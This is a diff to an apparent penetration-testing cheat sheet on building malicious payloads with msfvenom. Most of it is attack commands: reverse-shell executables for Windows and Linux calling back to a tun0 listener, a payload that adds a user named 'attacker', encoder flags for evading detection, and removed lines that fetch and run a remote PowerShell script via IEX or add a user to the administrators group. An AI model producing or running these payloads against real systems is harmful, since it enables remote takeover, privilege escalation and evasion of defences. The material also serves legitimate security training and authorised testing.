@@ -7,9 +7,10 @@ description: Generate payload with MSFvenom
 ### Listing
 
 ```bash
-msfvenom -l payloads #Payloads
-msfvenom -l encoders #Encoders
-msfvenom -l platforms #Platforms
+msfvenom -l payloads # Payloads
+msfvenom -l encoders # Encoders
+msfvenom -l platforms # Platforms
+msfvenom -l formats # Formats
 ```
 
 {% hint style="info" %}
@@ -48,26 +49,17 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.wa
 Create User
 
 ```bash
-msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
+msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe -o adduser.exe
 ```
 
 Execute Command
 
 {% code overflow="wrap" %}
 ```bash
-msfvenom -a x86 --platform Windows \
--p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" \
--f exe > payload.exe
-```
-{% endcode %}
-
-{% code overflow="wrap" %}
-```bash
 # x86
-msfvenom -a x86 --platform Windows -p \
-windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
+msfvenom -a x86 --platform Windows -p windows/exec CMD="calc.exe" -e x86/shikata_ga_nai -f exe -o payload.exe
 # x64
-msfvenom -a x64 --platform Windows -p windows/x64/exec CMD="net localgroup administrators shaun /add" -f exe > add-admin.exe
+msfvenom -a x64 --platform Windows -p windows/x64/exec CMD="calc.exe" -f exe -e x64/xor_dynamic -o payload-x64.exe
 ```
 {% endcode %}
 
@@ -76,22 +68,22 @@ Reverse Shell
 {% code overflow="wrap" %}
 ```bash
 # x86
-msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=1337 -f exe -o Remote.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4443 -f exe -e x86/shikata_ga_nai -o reverse86.exe
 # x64
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4443 -f exe -o shell.exe
+msfvenom --payload windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4443 --format exe --encoder x64/xor_dynamic --out reverse64.exe
 ```
 {% endcode %}
 
 ### Linux
 
+{% code overflow="wrap" %}
 ```bash
 # x86
-msfvenom  -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=1337 \
--e x86/shikata_ga_nai -f elf > asuka-x86.elf
+msfvenom  -p linux/x86/shell_reverse_tcp LHOST=tun0 LPORT=1337 -e x86/shikata_ga_nai -f elf -o asuka-x86.elf
 # x64
-msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp \
-LHOST=<IP> LPORT=1337 -e x64/xor_dynamic -f elf > asuka.elf
+msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -e x64/xor_dynamic -f elf -o asuka-64.elf
 ```
+{% endcode %}
 
 ### MSFvenom Payload Creator (MSFPC)
 
